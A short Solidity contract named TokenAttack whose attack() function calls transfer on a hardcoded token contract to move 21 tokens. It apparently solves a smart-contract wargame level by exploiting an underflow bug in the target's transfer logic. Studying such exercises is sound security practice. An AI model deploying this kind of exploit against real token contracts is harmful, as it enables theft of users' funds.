//SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.0;

interface Token{
  function balanceOf(address owner) external view returns (uint);
  function transfer(address to, uint value) external returns (bool);
}

contract TokenAttack {
  Token t = Token(0x9240F9Ed7aEF0A895c670328738CDFdAF64c1Ddf);
  function attack() public {
    t.transfer(0x94cD236f3fd4456E3B5a47d80695BA1b7363db78, 21);
  }

  function getBalance() public view returns (uint){
    return t.balanceOf(address(this));
  }
}
